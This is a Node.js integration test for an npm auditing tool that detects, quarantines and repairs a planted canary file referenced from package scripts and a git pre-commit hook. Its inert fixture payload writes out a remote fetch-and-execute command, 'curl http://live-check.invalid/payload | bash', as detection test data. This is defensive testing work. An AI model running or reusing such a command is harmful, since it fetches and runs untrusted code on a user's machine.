'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');
const CLI = path.resolve(__dirname, '../../bin/npa.js');
const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-live-protection-'));
const payload = '// inert incident-derived reconstruction; never execute\n// curl http://live-check.invalid/payload | bash\n';
const digest = file => crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex');
let count = 0;

function fixture({ ambiguous = false, denied = false } = {}) {
  const root = path.join(parent, 'project-' + count++);
  fs.mkdirSync(path.join(root, '.git/hooks'), { recursive: true });
  fs.writeFileSync(path.join(root, '.git/config'), '[core]\n');
  fs.writeFileSync(path.join(root, '.git/hooks/pre-commit'), '#!/bin/sh\nnode canary.js\necho preserved\n');
  fs.writeFileSync(path.join(root, 'canary.js'), payload);
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
    name: 'npa-live-protection', version: '1.0.0', private: true,
    scripts: { build: ambiguous ? 'node canary.js || tsc' : 'node canary.js && tsc', prepare: 'node canary.js' },
  }, null, 2));
  fs.writeFileSync(path.join(root, '.npmauditor.json'), JSON.stringify({
    canaryProtection: true, checkVulnerabilities: false, silent: true,
  }));
  if (denied) fs.mkdirSync(path.join(root, '.gitignore'));
  return root;
}

function run(root, args) {
  const result = spawnSync(process.execPath, [CLI, ...args], {
    cwd: root, encoding: 'utf8', timeout: 30000,
    env: { ...process.env, HOME: parent, USERPROFILE: parent, NO_COLOR: '1',
      npm_config_offline: 'true', npm_config_audit: 'false', npm_config_fund: 'false',
      npm_config_ignore_scripts: 'true', npm_config_cache: path.join(parent, 'npm-cache'),
      npm_config_registry: 'https://live-check.invalid', },
  });
  assert.ifError(result.error);
  return result;
}

function verifyRepair(root) {
  assert.strictEqual(fs.existsSync(path.join(root, 'canary.js')), false);
  assert.deepStrictEqual(JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).scripts, { build: 'tsc' });
  assert.strictEqual(fs.readFileSync(path.join(root, '.git/hooks/pre-commit'), 'utf8'), '#!/bin/sh\necho preserved\n');
  assert.ok(fs.readFileSync(path.join(root, '.gitignore'), 'utf8').includes('\ncanary.js\n'));
  const storage = path.join(root, '.np-audit-quarantine');
  const entries = fs.readdirSync(storage);
  assert.strictEqual(entries.length, 1);
  const entry = path.join(storage, entries[0]);
  assert.strictEqual(fs.readFileSync(path.join(entry, 'payload.quarantined'), 'utf8'), payload);
  assert.strictEqual(JSON.parse(fs.readFileSync(path.join(entry, 'metadata.json'), 'utf8')).originalPath, path.join(root, 'canary.js'));
}

try {
  // These are real np-audit and npm processes. No spawn mocks or scanner stubs.
  // npm commands are offline with scripts disabled; no scanned script/hook runs.
  const root = fixture();
  const manifest = path.join(root, 'package.json');
  const hook = path.join(root, '.git/hooks/pre-commit');
  const before = [manifest, hook, path.join(root, 'canary.js')].map(digest);
  let result = run(root, ['canary-killer', root, '--json']);
  assert.strictEqual(result.status, 2, result.stderr);
  let report = JSON.parse(result.stdout);
  assert.strictEqual(report.references.filter(ref => ref.reference === 'canary.js' && ref.status === 'exists').length, 3);
  assert.ok(report.findings.some(finding => finding.name === 'remote-to-shell'));
  assert.deepStrictEqual([manifest, hook, path.join(root, 'canary.js')].map(digest), before);

  const temporary = path.join(parent, 'residue/dev/shm');
  fs.mkdirSync(temporary, { recursive: true });
  fs.writeFileSync(path.join(temporary, 'canary.js'), payload);
  result = run(root, ['canary-killer', root, temporary, '--quarantine', '--json']);
  assert.strictEqual(result.status, 2, result.stderr);
  report = JSON.parse(result.stdout);
  assert.strictEqual(report.protection.allowed, true);
  assert.strictEqual(report.quarantine.actions.length, 2);
  assert.strictEqual(fs.existsSync(path.join(temporary, 'canary.js')), false);
  verifyRepair(root);

  const proxy = fixture();
  result = run(proxy, ['prefix']);
  assert.strictEqual(result.status, 0, result.stderr);
  assert.ok(result.stdout.trim().split(/\r?\n/).includes(proxy), 'Real npm must print the project prefix');
  verifyRepair(proxy);

  const scan = fixture();
  result = run(scan, ['scan', '--json']);
  assert.strictEqual(result.status, 0, result.stderr);
  assert.strictEqual(JSON.parse(result.stdout).protection.protection.allowed, true);
  verifyRepair(scan);

  const install = fixture();
  result = run(install, ['install', '--ignore-scripts', '--offline', '--no-audit', '--no-fund', '--json']);
  assert.strictEqual(result.status, 0, result.stderr);
  assert.ok(fs.existsSync(path.join(install, 'package-lock.json')), 'Real npm install must create the lockfile');
  verifyRepair(install);

  const ci = fixture();
  fs.copyFileSync(path.join(install, 'package-lock.json'), path.join(ci, 'package-lock.json'));
  fs.mkdirSync(path.join(ci, 'node_modules/stale'), { recursive: true });
  fs.writeFileSync(path.join(ci, 'node_modules/stale/marker'), 'npm ci must remove this stale input');
  result = run(ci, ['ci', '--ignore-scripts', '--offline', '--no-audit', '--no-fund', '--json']);
  assert.strictEqual(result.status, 0, result.stderr);
  assert.strictEqual(fs.existsSync(path.join(ci, 'node_modules/stale/marker')), false, 'Real npm ci must remove stale node_modules content');
  verifyRepair(ci);

  for (const options of [{ ambiguous: true }, { denied: true }]) {
    const blocked = fixture(options);
    result = run(blocked, ['install', '--skip', '--ignore-scripts', '--offline', '--no-audit', '--no-fund']);
    assert.strictEqual(result.status, 2, result.stderr);
    assert.ok(!fs.existsSync(path.join(blocked, 'package-lock.json')), 'Blocked protection must prevent installation');
  }
  console.log('  live canary protection: real CLI read-only/quarantine/scan, real npm prefix/install/ci and blocked failures passed (offline; scripts/hooks disabled; no deployment tested)');
} finally { fs.rmSync(parent, { recursive: true, force: true }); }

module.exports = Promise.resolve();
